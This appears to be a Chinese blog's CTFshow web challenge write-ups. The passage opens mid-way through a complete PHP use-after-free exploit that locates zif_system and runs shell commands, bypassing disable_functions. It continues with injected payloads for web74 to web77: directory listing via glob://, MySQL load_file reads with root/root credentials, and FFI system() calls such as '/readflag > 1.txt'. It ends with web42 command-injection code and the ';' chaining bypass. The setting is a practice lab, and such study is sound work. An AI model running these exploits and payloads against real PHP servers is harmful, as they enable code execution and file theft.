class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$v</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">length</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$length</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">10000</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$a</span>[<span class="variable">$i</span>])&#123;</span><br><span class="line">            <span class="variable">$length</span> += <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$length</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">length</span>(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; </span><br><span class="line"></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; </span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$arg</span> = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line">        <span class="variable">$vuln</span> = <span class="keyword">new</span> <span class="title class_">Vuln</span>();</span><br><span class="line">        <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; </span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">trigger_uaf</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> <span class="title class_">Helper</span>;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">length</span>(<span class="variable">$abc</span>) == <span class="number">79</span> || <span class="title function_ invoke__">length</span>(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_handlers</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); </span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); </span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ctfshow</span>(<span class="string">&quot;cat /flagc.txt&quot;</span>);<span class="title function_ invoke__">ob_end_flush</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>但是访问之后会502，看了视频发现也是502</p><h1 id="web74"><a href="#web74" class="headerlink" title="web74"></a>web74</h1><p>先扫目录文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)</span><br><span class="line">&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>文件被修改为flagx.txt，直接像上一道题一样include文件包含就行。</p><h1 id="web75"><a href="#web75" class="headerlink" title="web75"></a>web75</h1><p>先看文件目录：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><p>抽象，看了视频说直接使用数据库。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">try</span> &#123;<span class="variable">$dbh</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;root&#x27;</span>);<span class="keyword">foreach</span>(<span class="variable">$dbh</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) <span class="keyword">as</span> <span class="variable">$row</span>)</span><br><span class="line">&#123;<span class="keyword">echo</span>(<span class="variable">$row</span>[<span class="number">0</span>]).<span class="string">&quot;|&quot;</span>; &#125;<span class="variable">$dbh</span> = <span class="literal">null</span>;&#125;<span class="keyword">catch</span> (PDOException <span class="variable">$e</span>) &#123;<span class="keyword">echo</span> <span class="variable">$e</span>-</span><br><span class="line">&gt;<span class="title function_ invoke__">getMessage</span>();<span class="keyword">exit</span>(<span class="number">0</span>);&#125;<span class="keyword">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>但是他并没有提这个数据库名称是怎么来的。<br>我们可以通过通用的数据库来获取到数据库的名称：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$dsn</span> = <span class="string">&quot;mysql:host=localhost;dbname=information_schema&quot;</span>;</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="variable">$dsn</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;root&#x27;</span>);</span><br><span class="line"><span class="variable">$rs</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;select group_concat(SCHEMA_NAME) from SCHEMATA&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$rs</span> <span class="keyword">as</span> <span class="variable">$row</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable">$row</span>[<span class="number">0</span>]).<span class="string">&quot;|&quot;</span>; </span><br><span class="line">&#125;<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681290428024-3c729f7a-edc5-4787-a8df-5f0a30f7a678.png" alt="image.png"><br>然后在使用他提供的payload就可以了。</p><h1 id="web76"><a href="#web76" class="headerlink" title="web76"></a>web76</h1><p>文件名修改为了flag36d.txt<br>直接用上一道题的payload获取flag即可。</p><h1 id="web77"><a href="#web77" class="headerlink" title="web77"></a>web77</h1><blockquote><p><a href="https://blog.csdn.net/weixin_44700621/article/details/125381763">https://blog.csdn.net/weixin_44700621/article/details/125381763</a> 这个写的挺全的</p></blockquote><p>还是先看文件名，发现有两个可疑文件：flag36x.tx t和 readflag<br>题里面提示了是php7.4。payload使用的是PHP 7.4+的FFI特性，即外部函数接口特性</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ffi</span> = FFI::<span class="title function_ invoke__">cdef</span>(<span class="string">&quot;int system(const char *command);&quot;</span>);<span class="comment">//创建一个system对象</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;/readflag &gt; 1.txt&#x27;</span>;<span class="comment">//没有回显的</span></span><br><span class="line"><span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">system</span>(<span class="variable">$a</span>);<span class="comment">//通过$ffi去调用system函数</span></span><br></pre></td></tr></table></figure><p>由于没有回显，所以这里要把结果写到1.txt里面。<br>PHP手册中对<code>FFI:cdef</code>原型的描述为<code>public static FFI::cdef(string $code = &quot;&quot;, ?string $lib = null)</code>，其中$code为一个字符串，包含常规C语言中的一系列声明，$lib为要加载和链接的共享库文件名称，如果省略lib，则平台将会尝试在全局范围内查找代码中声明的符号，其他系统将无法解析这些符号。<br><code>int system(const char *command);</code>即为C语言中system函数的定义，用于执行系统命令，也即在Linux平台下将/readflag &gt; 1.txt使用shell进行解析并执行，因此猜测readflag可能是一个可执行文件。<br>因此也可以用这种方法读取根目录下的文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$ffi</span> = FFI::<span class="title function_ invoke__">cdef</span>(<span class="string">&quot;int system(const char *command);&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;ls / &gt; 1.txt&#x27;</span>;</span><br><span class="line"><span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">system</span>(<span class="variable">$a</span>);<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681291412242-bd33651d-8eaf-4013-bf26-6ab8ad987bfd.png" alt="image.png"><br>最后的获取flag的payload如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$ffi</span> = FFI::<span class="title function_ invoke__">cdef</span>(<span class="string">&quot;int system(const char *command);&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;/readflag &gt; 1.txt&#x27;</span>;</span><br><span class="line"><span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">system</span>(<span class="variable">$a</span>);<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>后面几道题做起来真是抽象中的抽象，但是也给了我很多视角，感觉挺耳目一新的就是那个73里面对uaf的方法重写的想法挺新奇的，之前没有想过。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web42-57命令执行篇（二）</title>
      <link href="/2023/03/30/web42-57%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AF%87%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>/2023/03/30/web42-57%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AF%87%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">  <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在变量后面拼接了一堆字符串。在此之前，我们需要先思考这一串是什么东西。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;/dev/null <span class="number">2</span>&gt;&amp;<span class="number">1</span> </span><br></pre></td></tr></table></figure><p>就是让标准输出重定向到/dev/null中（丢弃标准输出），然后错误输出由于重用了标准输出的描述符，所以错误输出也被定向到了/dev/null中，错误输出同样也被丢弃了。执行了这条命令之后，该条shell命令将不会输出任何信息到控制台，也不会有任何信息输出到文件中。<br>因此这个也被成为数据黑洞（还是很形象的）。<br>这部分的bypass是双写，让后面的指令结果进入黑洞，但是保全前面的命令。<br>比如说：<code>?c=ls;ls</code>，这就出现了运行结果。<br><img 